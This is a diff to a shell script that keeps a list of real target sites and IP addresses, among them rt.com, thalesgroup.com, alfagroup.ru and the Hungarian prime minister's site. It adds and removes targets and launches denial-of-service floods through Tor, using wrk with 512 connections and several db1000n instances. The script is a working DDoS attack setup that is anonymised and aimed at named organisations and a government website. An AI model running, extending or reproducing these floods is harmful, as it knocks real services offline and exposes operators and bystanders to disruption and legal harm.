@@ -12,19 +12,13 @@ URLS=(
   "https://alfagroup.ru" 
   "https://rt.com" 
   "https://thalesgroup.com"
+   "http://thalesgroup.com"
   "https://primeminister.hu"
-   "http://193.37.157.24:80/" 
-  "https://193.37.157.24:443/"
-   "http://193.0.214.42:80/"
-  "https://193.0.214.42:443/"
-   "http://91.213.144.43:80/"
-  "https://91.213.144.43:443/"
-   "http://213.109.72.155:80/"
-  "https://213.109.72.155:443/"
-   "http://46.17.202.70:80/"
-  "https://46.17.202.70:443/"
-   "http://46.17.202.90:80/"
-  "https://46.17.202.90:443/"
+   "http://primeminister.hu"
+  "https://13.37.9.16:443/"             # yet more thalesgroup
+   "http://13.37.9.16:80/"              # and more of them
+  "https://84.206.129.92:443/"          # yet more mr orban personal site
+   "http://84.206.129.92:80/"           # and more of mr orban's
    "http://62.76.102.63:80/"
   "https://62.76.102.63:443/"
    "http://46.48.118.29:80/"
@@ -51,4 +45,7 @@ torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://primeminister.hu &
 
 torsocks /root/Downloads/db1000n &  
 torsocks /root/Downloads/db1000n &  
-torsocks /root/Downloads/db1000n &  
+torsocks /root/Downloads/db1000n & 
+torsocks /root/Downloads/db1000n & 
+torsocks /root/Downloads/db1000n & 
+torsocks /root/Downloads/db1000n & 
